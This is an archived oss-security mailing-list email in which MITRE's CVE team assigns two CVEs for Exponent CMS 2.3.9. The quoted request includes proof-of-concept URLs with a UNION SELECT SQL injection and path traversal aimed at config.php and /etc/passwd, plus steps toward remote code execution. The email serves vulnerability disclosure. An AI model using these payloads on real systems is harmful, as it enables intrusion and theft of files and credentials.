X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2522" "Sunday" "18" "September" "2016" "13:04:39" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160918170439.ADBAF42E002@smtpvbsrv1.mitre.org>" "56" "[oss-security] Re: CVE request : Exponent CMS 2.3.9 SQL injection vulnerability" nil nil nil "9" "2016091817:04:39" "[oss-security] Re: CVE request : Exponent CMS 2.3.9 SQL injection vulnerability" (number mark "U       cve-assign@m Sep 18   56/2522  " thread-indent "\"[oss-security] Re: CVE request : Exponent CMS 2.3.9 SQL injection vulnerability\"\n") "<CAEiFw0WYE5q8jTO5napPQRKuGfnm1Q-VHg_ioEsKN6PX6Lxdnw@mail.gmail.com>" ("<CAEiFw0WYE5q8jTO5napPQRKuGfnm1Q-VHg_ioEsKN6PX6Lxdnw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9847 invoked by uid 550); 18 Sep 2016 17:04:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9817 invoked from network); 18 Sep 2016 17:04:51 -0000
From: cve-assign@mitre.org
To: felixk3y@gmail.com
Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
In-Reply-To: <CAEiFw0WYE5q8jTO5napPQRKuGfnm1Q-VHg_ioEsKN6PX6Lxdnw@mail.gmail.com>
Message-Id: <20160918170439.ADBAF42E002@smtpvbsrv1.mitre.org>
Date: Sun, 18 Sep 2016 13:04:39 -0400 (EDT)
Subject: [oss-security] Re: CVE request : Exponent CMS 2.3.9 SQL injection vulnerability

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/pixidou/controllers/pixidouController.php#L83-L91
> The "fid" parameter fail to sufficiently sanitize before using it in an SQL
> query, In This vulnerability, also lead to Directory traversal, Remote code
> execution vulnerabilities etc..
> 
> 1) Directory traversal vulnerability
> http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
> union select
> 1,'./','1.txt',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../framework/conf/config.php
> 
> 2) Remote code execution
>  i. Upload any legal files through website(.jpg|.gif etc..)
>  ii. copy file to evil file(.php etc..)
> 
> Proof of concept:
> http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
> union select
> 1,'./','evil.php',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../../../../../../../etc/passwd
> 
> And Now, The SQL Injection vulnerability have been fixed.
> https://exponentcms.lighthouseapp.com/projects/61783/changesets/c1092f167cc6c78dc8bf9bf149946c5219413df3
> https://github.com/exponentcms/exponent-cms/commit/c1092f167cc6c78dc8bf9bf149946c5219413df3

Use CVE-2016-7452 for the directory traversal issue fixed by the
"strpos($this->params['cpi'], '..')" check in
c1092f167cc6c78dc8bf9bf149946c5219413df3.

Use CVE-2016-7453 for the SQL injection issue fixed by the
intval($this->params['fid']) call in
c1092f167cc6c78dc8bf9bf149946c5219413df3.

- -- 
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJX3shtAAoJEHb/MwWLVhi21KwP/iyL/R3UtWIyGgsRLgYCHfiI
UcLYWRA9eGFdm9cAeq+C5lJoyKkxjP6jeExQEE0o0jPR0wHcuya87JP8VYxjla0X
QrsbtRk0N9bWLT9Hnt/AUXl4kRL4/V2rQu1dfdO5/ZT4/fu708qOyBOetVPPp+IY
i9LteoDEsTeDs8LtF8vQjC9myYSP3uZVOW5yl1s3AmqbebUWHNYOUn5x0ts1h6mu
4wAxXq7lBS0Lo/pi1OPBZGSlNJ06rgU6giksivSG9EuVQ2c9vngiJLOyGYFCB5kk
xSHu4m51Wdg34QVlv3qibWtYp9Ni/72yUNpsYwTGZelh4khIRu7sou5Dy0VFKDCX
elnFnjeF/zffE1hSTZz7Qf6bzikyHr6t7zfoh1Mob3GEc9BskjAuRcy4vS5D1NxK
vF/ZXTuMA8fYmD83nY55kdGzOBr3rMV22gC2BpMTfAb/GklRTN9X5Jvr2GYQdIF7
tiNWiq9XA63CrptuZ2iprItCKFNvEtH3O67U7b5ITAzQc8X66PgX9ZpwKAIJGDV8
EOCycuetg4zUp7uglB5+dznodH404ky2TV0O45K8Bzt4cvh2CBEMNZwI8A4JLzxt
IuyGjmVlSYEIDzDwK/VV9lHz0uOne5TOs7l5UVTVwk1LGUFWsD6LPyWAIujSplUl
S56PM1ifmk+8oJ5eQK/e
=Bayi
-----END PGP SIGNATURE-----
